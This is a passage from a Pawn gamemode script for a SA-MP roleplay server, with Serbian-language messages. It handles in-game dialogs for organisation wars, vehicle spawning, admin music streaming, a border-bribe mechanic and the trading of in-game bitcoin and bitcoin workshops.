            if( WARInfo[ w ][ warTeamMembers ][ 1 ] >= WARInfo[ w ][ warMapMembers ] ) return SendErrorMessage(playerid, "Imate maksimalan broj clanova u waru!");

            GetPlayerPos( player, WARPInfo[ player ][ LastPosition ][ 0 ], WARPInfo[ player ][ LastPosition ][ 1 ],  WARPInfo[ player ][ LastPosition ][ 2 ] );
            WARPInfo[ player ][ LastVirtualWorld ] = GetPlayerVirtualWorld( player );
            WARPInfo[ player ][ LastInterior ] = GetPlayerInterior( player );

            new rand2 = random( sizeof( warMap1Team2 ) );
            new rand22 = random( sizeof( warMap2Team2 ) );
            new rand32 = random( sizeof( warMap3Team2 ) );
            new rand42 = random( sizeof( warMap4Team2 ) );
            new rand52 = random( sizeof( warMap5Team2 ) );
            new rand62 = random( sizeof( warMap6Team2 ) );
            if( WARInfo[ w ][ warMap ] == 1 ) {
                SetPlayerPos( player, warMap1Team2[ rand2 ][ 0 ], warMap1Team2[ rand2 ][ 1 ],warMap1Team2[ rand2 ][ 2 ] );
                SetPlayerInterior( player, 0 );
            }
            else if( WARInfo[ w ][ warMap ] == 2 ) {
                SetPlayerPos( player, warMap2Team2[ rand22 ][ 0 ], warMap2Team2[ rand22 ][ 1 ],warMap2Team2[ rand22 ][ 2 ] );
                SetPlayerInterior( player, 10 );
            }
            else if( WARInfo[ w ][ warMap ] == 3 ) {
                SetPlayerPos( player, warMap3Team2[ rand32 ][ 0 ], warMap3Team2[ rand32 ][ 1 ],warMap3Team2[ rand32 ][ 2 ] );
                SetPlayerInterior( player, 0 );
            }
            else if( WARInfo[ w ][ warMap ] == 4 ) {
                SetPlayerPos( player, warMap4Team2[ rand42 ][ 0 ], warMap4Team2[ rand42 ][ 1 ],warMap4Team2[ rand42 ][ 2 ] );
                SetPlayerInterior( player, 0 );
            }
            else if( WARInfo[ w ][ warMap ] == 5 ) {
                SetPlayerPos( player, warMap5Team2[ rand52 ][ 0 ], warMap5Team2[ rand52 ][ 1 ],warMap5Team2[ rand52 ][ 2 ] );
                SetPlayerInterior( player, 0 );
            }
            else if( WARInfo[ w ][ warMap ] == 6 ) {
                SetPlayerPos( player, warMap6Team2[ rand62 ][ 0 ], warMap6Team2[ rand62 ][ 1 ],warMap6Team2[ rand62 ][ 2 ] );
                SetPlayerInterior( player, 0 );
            }

            GiveWeaponToPlayer( player, WARInfo[ w ][ warGuns ][ 0 ], 300 );
            GiveWeaponToPlayer( player, WARInfo[ w ][ warGuns ][ 1 ], 300 );
            GiveWeaponToPlayer( player, WARInfo[ w ][ warGuns ][ 2 ], 300 );
            GiveWeaponToPlayer( player, WARInfo[ w ][ warGuns ][ 3 ], 300 );
            SetPlayerVirtualWorld( player, w );
            SetPlayerHealth( player, 100 );

            WARInfo[ w ][ warTeamMembers ][ 1 ]++;

            ResetWarStatistics( player );
            WARPInfo[ player ][ warTeam ][ 1 ] = true;
            WARPInfo[ player ][ warID ] = w;

            format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR "COL_WHITE"| "COL_ORANGE"Team 1: "COL_WHITE"%s "COL_WHITE"| "COL_ORANGE"Team 2: "COL_WHITE"%s", getOrgName( GetPlayerMember( WARInfo[ w ][ warTeamLeader ][ 0 ] ) ), getOrgName( GetPlayerMember( WARInfo[ w ][ warTeamLeader ][ 1 ] ) ) );
            SCM( player, -1, globalstring );
            SCM( player, -1, "War chat /wp." );
            SCM( playerid, -1, "Pozvao si igraca" );

            WarTDControl( player, true );
            SetWarStatsTD( w );
        }
    }
    else if( dialogid == dialog_WAR_CREATE_1 && response) {
        new warid = -1;
        for(new w = 0; w < MAX_WARS; w ++) {
            if( WARInfo[ w ][ warActive ] == false && WARInfo[ w ][ warCreating ] == false ) {
                warid = w;
                break;
            }
        }
        if( warid == -1 ) { 
            format( globalstring, sizeof( globalstring ), "ERROR | "COL_WHITE"Vec je zapoceto %d war-ova, sacekaj da neko zavrsi.", MAX_WARS );
            SCM( playerid, SRVBOJA1, globalstring );
            return true;
        }
        CreatingWAR[ playerid ] = warid;
        WARInfo[ warid ][ warCreating ] = true;
        WARInfo[ warid ][ warActive ] = false;
        if( listitem == 0 ) { WARInfo[ warid ][ warMap ] = 1; }
        if( listitem == 1 ) { WARInfo[ warid ][ warMap ] = 2; }
        if( listitem == 2 ) { WARInfo[ warid ][ warMap ] = 3; }
        if( listitem == 3 ) { WARInfo[ warid ][ warMap ] = 4; }
        if( listitem == 4 ) { WARInfo[ warid ][ warMap ] = 5; }
        if( listitem == 5 ) { WARInfo[ warid ][ warMap ] = 6; }
        SPD( playerid, dialog_WAR_CREATE_2, DSL, "Oruzije slot 1", "Deagle\nColt 45\nSilenced Pistol", "Potvrdi", "Odustani" );
    }
    else if( dialogid == dialog_WAR_CREATE_2 ) {
        if( response ) {
            new w = CreatingWAR[ playerid ];
            if( listitem == 0 ) { WARInfo[ w ][ warGuns ][ 0 ] = 24; }
            if( listitem == 1 ) { WARInfo[ w ][ warGuns ][ 0 ] = 22; }
            if( listitem == 2 ) { WARInfo[ w ][ warGuns ][ 0 ] = 23; }
            SPD( playerid, dialog_WAR_CREATE_3, DSL, "Oruzije slot 2", "Uzi\nMP5", "Potvrdi", "Odustani");
        }
        else if( !response ) {
            new w = CreatingWAR[ playerid ];
            WARInfo[ w ][ warCreating ] = false;
            WARInfo[ w ][ warActive ] = false;
            CreatingWAR[ playerid ] = -1;
        }
    }
    else if( dialogid == dialog_WAR_CREATE_3 ) {
        if( response ) {
            new w = CreatingWAR[ playerid ];
            if( listitem == 0 ) { WARInfo[ w ][ warGuns ][ 1 ] = 28; }
            if( listitem == 1 ) { WARInfo[ w ][ warGuns ][ 1 ] = 29; }
            SPD( playerid, dialog_WAR_CREATE_4, DSL, "Oruzije slot 3", "AK-47\nM4", "Potvrdi", "Odustani");
        }
        else if( !response ) {
            new w = CreatingWAR[ playerid ];
            WARInfo[ w ][ warCreating ] = false;
            WARInfo[ w ][ warActive ] = false;
            CreatingWAR[ playerid ] = -1;
        }
    }
    else if( dialogid == dialog_WAR_CREATE_4 ) {
        if( response ) {
            new w = CreatingWAR[ playerid ];
            if( listitem == 0 ) { WARInfo[ w ][ warGuns ][ 2 ] = 30; }
            if( listitem == 1 ) { WARInfo[ w ][ warGuns ][ 2 ] = 31; }
            SPD( playerid, dialog_WAR_CREATE_5, DSL, "Oruzije slot 4", "Country Rifle\nShotgun", "Potvrdi", "Odustani");
        }
        else if( !response ) {
            new w = CreatingWAR[ playerid ];
            WARInfo[ w ][ warCreating ] = false;
            WARInfo[ w ][ warActive ] = false;
            CreatingWAR[ playerid ] = -1;
        }
    }
    else if( dialogid == dialog_WAR_CREATE_5 ) {
        if( response ) {
            new w = CreatingWAR[ playerid ];
            if( listitem == 0 ) { WARInfo[ w ][ warGuns ][ 3 ] = 33; }
            if( listitem == 1 ) { WARInfo[ w ][ warGuns ][ 3 ] = 25; }
            SPD( playerid, dialog_WAR_CREATE_6, DSI, "Maximum clanova", "Unesite broj maksimum clanova koji mogu igrati war(3-10).", "Potvrdi", "Odustani");
        }
        else if( !response ) {
            new w = CreatingWAR[ playerid ];
            WARInfo[ w ][ warCreating ] = false;
            WARInfo[ w ][ warActive ] = false;
            CreatingWAR[ playerid ] = -1;
        }
    }
    else if( dialogid == dialog_WAR_CREATE_6 ) {
        if( response ) {
            new maxigraca, w = CreatingWAR[ playerid ];
            if( sscanf( inputtext, "i", maxigraca ) ) return SPD( playerid, dialog_WAR_CREATE_6, DSI, "Maximum clanova", "Unesite broj maksimum clanova koji mogu igrati war(3-10).", "Potvrdi", "Odustani");
            if( maxigraca < 3 || maxigraca > 10 ) return SPD( playerid, dialog_WAR_CREATE_6, DSI, "Maximum clanova", "Unesite broj maksimum clanova koji mogu igrati war(3-10).", "Potvrdi", "Odustani");
            WARInfo[ w ][ warMapMembers ] = maxigraca;
            SPD( playerid, dialog_WAR_CREATE_7, DSI, "Lider Protivnika", "ID lidera protivnika", "Potvrdi", "Odustani" );
        }
        else if( !response ) {
            new w = CreatingWAR[ playerid ];
            WARInfo[ w ][ warCreating ] = false;
            WARInfo[ w ][ warActive ] = false;
            CreatingWAR[ playerid ] = -1;
        }
    }
    else if( dialogid == dialog_WAR_CREATE_7 ) {
        if( response ) {
            new id, w = CreatingWAR[ playerid ], string[ 128 ];
            if( sscanf( inputtext, "u", id ) ) return SPD( playerid, dialog_WAR_CREATE_7, DSI, "Lider Protivnika", "ID lidera protivnika", "Potvrdi", "Odustani" );
            if( id == IPI ) return SPD( playerid, dialog_WAR_CREATE_7, DSI, "Lider Protivnika", "ID lidera protivnika", "Potvrdi", "Odustani" );
            if( GetPlayerLeader( playerid ) == GetPlayerLeader( id ) ) return SPD( playerid, dialog_WAR_CREATE_7, DSI, "Lider Protivnika", "ID lidera protivnika", "Potvrdi", "Odustani" );
            if( GetPlayerLeader( id ) < 1 ) return SPD( playerid, dialog_WAR_CREATE_7, DSI, "Lider Protivnika", "ID lidera protivnika", "Potvrdi", "Odustani" );
            if( id == playerid ) return SPD( playerid, dialog_WAR_CREATE_7, DSI, "Lider Protivnika", "ID lidera protivnika", "Potvrdi", "Odustani" );
            WARInfo[ w ][ warTeamLeader ][ 0 ] = playerid;
            WARInfo[ w ][ warTeamLeader ][ 1 ] = id;
            CreatingWAR[ id ] = w;
            format( string, sizeof( string ), ""COL_ORANGE"Leader "COL_WHITE"%s "COL_ORANGE"je poslao zahtev za war", getOrgName( GetPlayerMember( playerid ) ) );
            SPD( id, dialog_WAR_CREATE_8, DSMSG, "War Zahtev", string, "Prihvati", "Odustani" );
        }
        else if( !response ) {
            new w = CreatingWAR[ playerid ];
            WARInfo[ w ][ warCreating ] = false;
            WARInfo[ w ][ warActive ] = false;
            CreatingWAR[ playerid ] = -1;
        }
    }
    else if( dialogid == dialog_WAR_CREATE_8 ) {
        if( response ) {
            new w = CreatingWAR[ playerid ];
            SCM( WARInfo[ w ][ warTeamLeader ][ 1 ], -1, ""COL_ORANGE"WAR | "COL_WHITE"Prihvatio si poziv za war, sada pozovi igrace. War pocinje za 60 sekundi!");
            SCM( WARInfo[ w ][ warTeamLeader ][ 0 ], -1, ""COL_ORANGE"WAR | "COL_WHITE"Igrac je prihvatio poziv za war, sada pozovi igrace. War Pocinje za 60 sekundi!");

            defer startWar(w);

        }
        else {
            new w = CreatingWAR[ playerid ];
            SCM( WARInfo[ w ][ warTeamLeader ][ 0 ], -1, "Protivnik nije prihvatio zahtev za War" );
            WARInfo[ w ][ warCreating ] = false;
            WARInfo[ w ][ warActive ] = false;
            CreatingWAR[ WARInfo[ w ][ warTeamLeader ][ 0 ] ] = -1;
            CreatingWAR[ playerid ] = -1;
        }
    }

    if(dialogid == dialog_OrgVoziloUzmi && response) {

        new id = NajbliziMojIDOrgVeh(playerid);
        if(id == -1) return SendErrorMessage(playerid, "Nisi blizu Org Veh pickup-a!");

        new vozilo = -1;
        if(listitem == 0) vozilo = OrgVehInfo[id][oVehModel1];
        else if(listitem == 1) vozilo = OrgVehInfo[id][oVehModel2];
        else if(listitem == 2) vozilo = OrgVehInfo[id][oVehModel3];
        else if(listitem == 3) vozilo = OrgVehInfo[id][oVehModel4];
        else if(listitem == 4) vozilo = OrgVehInfo[id][oVehModel5];

        if(vozilo == -1) return SendErrorMessage(playerid, "Desila se greska! Pozovite admina!");

        if(listitem == 0 && OrgVehInfo[id][oVehKolicina1] == 0) return SendErrorMessage(playerid, "Nemas vise tih vozila!"); 
        if(listitem == 1 && OrgVehInfo[id][oVehKolicina2] == 0) return SendErrorMessage(playerid, "Nemas vise tih vozila!"); 
        if(listitem == 2 && OrgVehInfo[id][oVehKolicina3] == 0) return SendErrorMessage(playerid, "Nemas vise tih vozila!"); 
        if(listitem == 3 && OrgVehInfo[id][oVehKolicina4] == 0) return SendErrorMessage(playerid, "Nemas vise tih vozila!");
        if(listitem == 4 && OrgVehInfo[id][oVehKolicina5] == 0) return SendErrorMessage(playerid, "Nemas vise tih vozila!");  

        new Float:X, Float:Y, Float:Z;
        GetPlayerPos(playerid, X,Y,Z);

        if(OrgVehInfo[id][oVehSpawnX] != 0 && OrgVehInfo[id][oVehSpawnX] != 0) {

            X = OrgVehInfo[id][oVehSpawnX];
            Y = OrgVehInfo[id][oVehSpawnY];
            Z = OrgVehInfo[id][oVehSpawnZ];
        }

        Novi_DestroyVehicle(OrgVeh[playerid]);
        OrgVeh[ playerid ] = V01D_CreateVehicle(vozilo, X, Y, Z, 0.0, OrgVehInfo[id][oVehColor], OrgVehInfo[id][oVehColor], -1 );
        Novi_PutPlayerInVehicle(playerid, OrgVeh[playerid], 0);
        

        switch(listitem) {

            case 0: {

                OrgVehInfo[id][oVehKolicina1]--;
                OrgVehBroj[playerid] = 1;
                OrgVehID[playerid] = id;
                SendInfoMessage(playerid, "Stvorio si org vozilo! Ostalo je jos %d ove vrste!", OrgVehInfo[id][oVehKolicina1]);
            }
            case 1: {

                OrgVehBroj[playerid] = 2;
                OrgVehID[playerid] = id;
                OrgVehInfo[id][oVehKolicina2]--;
                SendInfoMessage(playerid, "Stvorio si org vozilo! Ostalo je jos %d ove vrste!", OrgVehInfo[id][oVehKolicina2]);
            }
            case 2: {

                OrgVehBroj[playerid] = 3;
                OrgVehID[playerid] = id;
                OrgVehInfo[id][oVehKolicina3]--;
                SendInfoMessage(playerid, "Stvorio si org vozilo! Ostalo je jos %d ove vrste!", OrgVehInfo[id][oVehKolicina3]);
            }
            case 3: {

                OrgVehBroj[playerid] = 4;
                OrgVehID[playerid] = id;
                OrgVehInfo[id][oVehKolicina4]--;
                SendInfoMessage(playerid, "Stvorio si org vozilo! Ostalo je jos %d ove vrste!", OrgVehInfo[id][oVehKolicina4]);
            }
            case 4: {

                OrgVehBroj[playerid] = 5;
                OrgVehID[playerid] = id;
                OrgVehInfo[id][oVehKolicina5]--;
                SendInfoMessage(playerid, "Stvorio si org vozilo! Ostalo je jos %d ove vrste!", OrgVehInfo[id][oVehKolicina5]);
            }
        }

        SacuvajOrgVehPickup(id);

        // new string[32];
        // new boja[32];
        // format(boja, sizeof(boja), "0x%sAA", OI[OrgVehInfo[id][oVehOrgID]][oColor]);
        // format(string, sizeof(string), "[ Organizacija - %s ]", getOrgName(OrgVehInfo[id][oVehOrgID]));
        // OrgVehLabelIgrac[playerid] = Create3DTextLabel(string, HexToInt(boja), X, Y, Z, 15.0, 0, 0);
        // Attach3DTextLabelToVehicle(OrgVehLabelIgrac[playerid], OrgVeh[playerid], 0, 0, 0);

        return 1;
    }

    if(dialogid == dialog_Muzika && response) {

        new broj;
        new urll[128];
        switch(listitem) {

            case 0: { format(urll, sizeof(urll), "%s", Music[0]); broj = 1; } 
            case 1: { format(urll, sizeof(urll), "%s", Music[2]); broj = 3; } 
            case 2: { format(urll, sizeof(urll), "%s", Music[4]); broj = 5; } 
            case 3: { format(urll, sizeof(urll), "%s", Music[6]); broj = 7; } 
            case 4: { format(urll, sizeof(urll), "%s", Music[8]); broj = 9; } 
            case 5: { format(urll, sizeof(urll), "%s", Music[10]); broj = 11; } 
            case 6: { format(urll, sizeof(urll), "%s", Music[12]); broj = 13; } 
            case 7: { format(urll, sizeof(urll), "%s", Music[14]); broj = 15; } 
            case 8: { format(urll, sizeof(urll), "%s", Music[16]); broj = 17; } 
            case 9: { format(urll, sizeof(urll), "%s", Music[18]); broj = 19; } 
            case 10: { format(urll, sizeof(urll), "%s", Music[20]); broj = 21; } 
            case 11: { format(urll, sizeof(urll), "%s", Music[22]); broj = 23; } 
            case 12: { format(urll, sizeof(urll), "%s", Music[24]); broj = 25; } 
        }

        foreach( Player, i ) {
    
            StopAudioStreamForPlayer( i );
            PlayAudioStreamForPlayer( i, urll );
        }
        new string[256];
        format( string, sizeof( string ), "MUZIKA | Admin %s je pustio pesmu [ %s ]( da prekinete /music( off ) ) |", ImeIgraca( playerid ), Music[broj]);
        SCMA( NARACRVENA, string );
        format( string, sizeof( string ), "MUZIKA | Da bi ponovo pustili kucajte /replaymusic |", ImeIgraca( playerid ) );
        SCMA( NARACRVENA, string );

        return 1;
    }

    if(dialogid == dialog_GranicaPretres) {

        if(!response) {

            PostaviWanted( playerid, "Posestvo Kokaina", "Granicna Policija", 10);

            SendInfoMessage(playerid, "Odbio si da platis i sada si trazen!");

            return 1;
        }
        if(response) {

            new sansa = RandomNew(1, 5);
            if(sansa == 5) {

                SendInfoMessage(playerid, "Granicni Policajac je odbio mito!");
                PostaviWanted( playerid, "Posestvo Kokaina", "Granicna Policija", 10);

                return 1;
            }

            new cena = TrenutniKokain[playerid] * 100;

            if(GetPlayerMoney(playerid) < cena) {

                SendInfoMessage(playerid, "Nemas dovoljno novca da podmitis granicnu policiju!");
                PostaviWanted( playerid, "Posestvo Kokaina", "Granicna Policija", 10);

                return 1;
            }

            DajIgracuNovac(playerid, -cena);
            SendInfoMessage(playerid, "Uspesno si podmitio granicnog policajca!");

            if(IsPlayerInRangeOfPoint(playerid, 3.0, 1803.1553,783.5743,11.5500)) //ULAZ Las Venturas
            {

                MoveObject(granicabgsaulaz, 1799.7670, 785.5780, 11.5160, 3.0, 0.0000, -33.0000, -178.0000);
                defer GranicaTimer1();
                SendClientMessageEx( playerid, SVETLOPLAVA, "%s daje isprave sluzbenom licu.", ImeIgraca(playerid));

                return 1;
            }
            else if(IsPlayerInRangeOfPoint(playerid, 3.0, 1789.0673,788.2881,11.4231)) //IZLAZ Las Venturas
            {

                MoveObject(granicabgsaizlaz, 1792.7410, 785.8330, 11.2110, 3.0, 0.0000, -33.0000, -4.0000);
                defer GranicaTimer2();
                SendClientMessageEx( playerid, SVETLOPLAVA, "%s daje isprave sluzbenom licu.", ImeIgraca(playerid));

                return 1;
            }
            else if(IsPlayerInRangeOfPoint(playerid, 3.0, 58.7950,-1525.6416,4.9652)) //IZLAZ IZ Los SantosA
            {

                MoveObject(granicabgzgulaz, 56.1060, -1529.3879, 5.0650, 3.0, 0.0000, -25.0000, -97.0000);
                defer GranicaTimer3();
                SendClientMessageEx( playerid, SVETLOPLAVA, "%s daje isprave sluzbenom licu.", ImeIgraca(playerid));

                return 1;
            }
            else if(IsPlayerInRangeOfPoint(playerid, 3.0, 44.0856,-1537.7295,5.1893)) //ULAZ U BG
            {

                MoveObject(granicabgzgizlaz, 47.1280, -1533.8110, 5.0650, 3.0, 4.0000, -25.0000, 83.0000);
                defer GranicaTimer4();
                SendClientMessageEx( playerid, SVETLOPLAVA, "%s daje isprave sluzbenom licu.", ImeIgraca(playerid));

                return 1;
            }

            return 1;
        }
    }

    if(dialogid == dialog_BTCProdaja && response) {

        switch(listitem) {

            case 0: {

                if(!IsPlayerInRangeOfPoint(playerid, 2.0, 1010.5294,1873.7450,1203.5000)) return SendErrorMessage(playerid, "Nisi u banci!");

                ShowPlayerDialog(playerid, dialog_BTCProdajaBanka, DIALOG_STYLE_INPUT, "Prodaja Banci", "Unesite koliko bitcoina zelite prodati banci", "Prodaj", "Odustani");

                return 1;
            }
            case 1: {

                if(!IsPlayerInRangeOfPoint(playerid, 2.0, 524.3888,-2558.3857,4.2118)) return SendErrorMessage(playerid, "Nisi na Black Marketu!");

                ShowPlayerDialog(playerid, dialog_BTCProdajaBlack, DIALOG_STYLE_INPUT, "Prodaja Black Marektu", "Unesite koliko bitcoina zelite prodati Black Marketu", "Prodaj", "Odustani");

                return 1;
            }
        }

        return 1;
    }

    if(dialogid == dialog_BTCProdajaBlack && response) {

        new btc;
        if(sscanf(inputtext, "d", btc)) return ShowPlayerDialog(playerid, dialog_BTCProdajaBlack, DIALOG_STYLE_INPUT, "Prodaja Black Marektu", "Nepravilan unos\nUnesite koliko bitcoina zelite prodati Black Marketu", "Prodaj", "Odustani");
        if(btc < 1 || btc > 1000) return SendErrorMessage(playerid, "Ne mozes manje od 1 ili vise od 1000 odjednom!");
        if(PlayerInfo[playerid][xBitcoin] < btc) return SendErrorMessage(playerid, "Nemas toliko bitcoina!");

        new cena = btc * 6000;

        new sansa = RandomNew(1, 5);

        if(sansa == 3) { //Dobija procenat

            DajIgracuNovac(playerid, cena/2);
            PlayerInfo[playerid][xBitcoin] -= btc;

            SendInfoMessage(playerid, "Diler : Nemam da ti isplatim sve! Sacekaj me par dana!");
            SendInfoMessage(playerid, "Za prodaju bitcoina si dobio %d$! Pazi sa kim poslujes!", cena/2);

            return 1;
        }
        else if(sansa == 4) { //Ne dobija nista

            //DajIgracuNovac(playerid, cena);
            PlayerInfo[playerid][xBitcoin] -= btc;

            SendInfoMessage(playerid, "Diler : Prevaren si! Bezi dok te nisam ubio!");
            SendInfoMessage(playerid, "Za prodaju bitcoina nisi dobio nista!");

            return 1;
        }

        DajIgracuNovac(playerid, cena);
        PlayerInfo[playerid][xBitcoin] -= btc;
        SavePlayer(playerid);

        SendInfoMessage(playerid, "Uspesno si prodao %d bitcoina za %d$!", btc, cena);

        if(PlayerInfo[playerid][xAchivements][6] == 0) {

            achivementPassed(playerid, 6, 1000);
        }

        return 1;
    }

    if(dialogid == dialog_BTCProdajaBanka && response) {

        new btc;
        if(sscanf(inputtext, "d", btc)) return ShowPlayerDialog(playerid, dialog_BTCProdajaBanka, DIALOG_STYLE_INPUT, "Prodaja Banci", "Nepravilan unos\nUnesite koliko bitcoina zelite prodati banci", "Prodaj", "Odustani");
        if(btc < 1 || btc > 1000) return SendErrorMessage(playerid, "Ne mozes manje od 1 ili vise od 1000 odjednom!");
        if(PlayerInfo[playerid][xBitcoin] < btc) return SendErrorMessage(playerid, "Nemas toliko bitcoina!");

        new cena = btc * 2000;

        DajIgracuNovac(playerid, cena);
        PlayerInfo[playerid][xBitcoin] -= btc;
        SavePlayer(playerid);

        SendInfoMessage(playerid, "Uspesno si prodao %d bitcoina za %d$!", btc, cena);

        if(PlayerInfo[playerid][xAchivements][6] == 0) {

            achivementPassed(playerid, 6, 3000);
        }

        return 1;
    }

    if(dialogid == dialog_BTCServer) {

        if(!response) return 0;
        if(response) {

            switch(listitem) {

                case 0: {

                    new reset[6];
                    new str[1024];
                    new id = PlayerInfo[playerid][xWorkShopID];

                    if( BitcoinInfo[id][bPokvareno] == 1 ) reset = "Da";
                    else reset = "Ne";

                    format( str, sizeof( str ),
                                ""SRVBOJA1SCM"Trenutni Novac: {FFFFFF}[%d BTC]\n"SRVBOJA1SCM"Potrebno Resetovanje: {FFFFFF}[%s]\n"SRVBOJA1SCM"Broj Masina: {FFFFFF}[%d]",
                                    BitcoinInfo[id][bNovac],
                                    reset,
                                    BitcoinInfo[id][bMasine]);

                    ShowPlayerDialog( playerid, 0, DSMSG, ""col_crvena"Status BitCoin Servera", str, "U redu", "" );

                    return 1;
                }
                case 1: {

                    new id = PlayerInfo[playerid][xWorkShopID];
                    if(BitcoinInfo[id][bPokvareno] == 0) return SendErrorMessage(playerid, "Tvom Bitcoin serveru nije potrebno resetovanje!");

                    BitcoinInfo[id][bPokvareno] = 0;
                    SacuvajBTCWorkShop(id);

                    SendInfoMessage(playerid, "Bitcoin server uspesno resetovan!");

                    return 1;
                }
                case 2: {

                    ShowPlayerDialog(playerid, dialog_BitcoinPodigni, DIALOG_STYLE_INPUT, "Podigni BitCoin", "Unesite koliko bitcoina zelite podici sa servera", "Potvrdi", "Odustani");
                    return 1;
                }
                case 3: {

                    new price = BTCWORKSHOP_PRICE / 4;
                    new str[128];
                    format(str, sizeof(str), "Da li ste sigurni da zelite da prodate vas Bitcoin WorkShop za %d$?", price);
                    ShowPlayerDialog(playerid, dialog_BitcoinSell, DIALOG_STYLE_MSGBOX, "Prodaja Drzavi", str, "Prodaj", "Odustani");

                    return 1;
                }
                case 4: {

                    if(ProdajeImovinu[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok cekas odgovor od igraca na kupovinu!");

                    ShowPlayerDialog(playerid, dialog_BitcoinSellPlayer, DIALOG_STYLE_INPUT, "Bitcoin Prodaj Igracu", "Unesite : ID igraca i cenu\nPrimer : 14 1500000", "Ponudi", "Odustani");

                    return 1;
                }
            }
        }
    }

    if(dialogid == dialog_BitcoinSellPlayer && response) {

        new idw = PlayerInfo[playerid][xWorkShopID];
        if(idw == -1) return SendErrorMessage(playerid, "Ne posedujes Bitcoin Workshop!");

        if(ProdajeImovinu[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok cekas odgovor od igraca na kupovinu!");

        new cena, id;
        if(sscanf(inputtext, "ud", id, cena)) return ShowPlayerDialog(playerid, dialog_BitcoinSellPlayer, DIALOG_STYLE_INPUT, "Bitcoin Prodaj Igracu", "Unesite : ID igraca i cenu\nPrimer : 14 1500000", "Ponudi", "Odustani");
        if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");
        if(PlayerInfo[id][xWorkShopID] != -1) return SendErrorMessage(playerid, "Igrac vec poseduje bitcoin workshop!");

        if(cena < 1 || cena > 99999999) return SendErrorMessage(playerid, "Cena ne moze biti manja od 1 ili veca od 99.999.999$!");

        ProdajeImovinu[playerid] = true;
        GlobalProdaja[id] = playerid;
        GlobalCena[id] = cena;
        new string[128];
        format(string, sizeof(string), "Igrac %s vam je ponudio svoj Bitcoin Workshop za %d$!", ImeIgraca(playerid), cena);

        ShowPlayerDialog(id, dialog_BitcoinSellPlayerAccept, DIALOG_STYLE_MSGBOX, "Kupi BitcoinWorkshop", string, "Kupi", "Odustani");

        return 1;
    }

    if(dialogid == dialog_BitcoinSellPlayerAccept) {

        if(!response) {

            new player = GlobalProdaja[playerid];
            GlobalProdaja[playerid] = -1;
            GlobalCena[playerid] = 0;

            ProdajeImovinu[player] = false;
            SendInfoMessage(playerid, "Odustao si od kupovine!");
            SendInfoMessage(player, "Igrac %s je odustao od kupovine!", ImeIgraca(playerid));

            return 1;
        }

        if(response) {

            new id = GlobalProdaja[playerid];
            new cena = GlobalCena[playerid];

            if(!IsPlayerConnected(playerid)) return SendErrorMessage(id, "Pogresan ID!");
            if(PlayerInfo[playerid][xWorkShopID] != -1) return SendErrorMessage(id, "Igrac vec poseduje bitcoin workshop!");

            if(GetPlayerMoney(playerid) < GlobalCena[playerid]) {

                GlobalProdaja[playerid] = -1;
                GlobalCena[playerid] = 0;

                ProdajeImovinu[id] = false;
                SendInfoMessage(playerid, "Odustao si od kupovine zato sto nemas dovoljno novca!");
                SendInfoMessage(id, "Igrac %s je odustao od kupovine zato sto nema dovoljno novca!", ImeIgraca(playerid));

                return 1;
            }

            GlobalProdaja[playerid] = -1;
            GlobalCena[playerid] = 0;

            ProdajeImovinu[id] = false;

            new workshopID = PlayerInfo[id][xWorkShopID];

            strmid(BitcoinInfo[workshopID][bVlasnik], ImeIgraca(playerid),0,strlen(ImeIgraca(playerid)),255);
            SacuvajBTCWorkShop(workshopID);
            BitCoinLP(workshopID);

            PlayerInfo[playerid][xWorkShopID] = workshopID;
            SavePlayer(playerid);

            PlayerInfo[id][xWorkShopID] = -1;
            SavePlayer(id);

            DajIgracuNovac(id, cena);
            DajIgracuNovac(playerid, -cena);

            FadeFromBlack( playerid );

            PortajIgraca( id, BitcoinInfo[ workshopID ][ bUlazX ], BitcoinInfo[ workshopID ][ bUlazY ], BitcoinInfo[ workshopID ][ bUlazZ ]);
            GameTextForPlayer( id, "Ucitavanje ...", 6000, 4 );
            SetTimerEx("SlobodnoSada", 6000, false, "i", id );
            SetCameraBehindPlayer( id );
            TogglePlayerControllable( id, 0 );
            SetPlayerInterior( id, 0 );
            SetPlayerVirtualWorld( id, 0 );

            SendInfoMessage(id, "Prodao si svoj bitcoin workshop igracu %s za %d$", ImeIgraca(playerid), cena);
            SendInfoMessage(playerid, "Kupio si bitcoin workshop od igraca %s za %d$", ImeIgraca(id), cena);

            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_BitcoinSell && response) {

        new id = PlayerInfo[playerid][xWorkShopID];
        if(id == -1) return SendErrorMessage(playerid, "Ne posedujes Bitcoin Workshop!");

        strmid(BitcoinInfo[id][bVlasnik],"Niko",0,strlen("Niko"),255);
        BitcoinInfo[id][bNovac] = 0;
        BitcoinInfo[id][bMasine] = 1;
        BitcoinInfo[id][bIzlazX] = 2318.5020;
        BitcoinInfo[id][bIzlazY] = -1786.4697;
        BitcoinInfo[id][bIzlazZ] = 1600.7520;
        BitcoinInfo[id][bPokvareno] = 0;
        SacuvajBTCWorkShop(id);

        if(IsValidDynamic3DTextLabel(BitCoinLabel[id]))
            DestroyDynamic3DTextLabel(BitCoinLabel[id]);

        if(IsValidDynamicPickup(BitCoinPickup[id]))
            DestroyDynamicPickup(BitCoinPickup[id]);

        new string[220];
        format(string, 220, ""SRVBOJA1SCM"[ BitCoin WorkShop ]\nVlasnik : "col_white"NIKO\n"SRVBOJA1SCM"ID: "col_white"%d\n"SRVBOJA1SCM"Cena: "col_white"%d$\n"SRVBOJA1SCM"Da kupis bitcoin workshop koristi /kupiworkshop", id, BTCWORKSHOP_PRICE);
        BitCoinLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, BitcoinInfo[id][bUlazX], BitcoinInfo[id][bUlazY], BitcoinInfo[id][bUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
        BitCoinPickup[id] = CreateDynamicPickup(18631, 1, BitcoinInfo[id][bUlazX], BitcoinInfo[id][bUlazY], BitcoinInfo[id][bUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);

        DajIgracuNovac(playerid, BTCWORKSHOP_PRICE/4);
        PlayerInfo[playerid][xWorkShopID] = -1;
        SavePlayer(playerid);

        FadeFromBlack( playerid );

        PortajIgraca( playerid, BitcoinInfo[ id ][ bUlazX ], BitcoinInfo[ id ][ bUlazY ], BitcoinInfo[ id ][ bUlazZ ]);
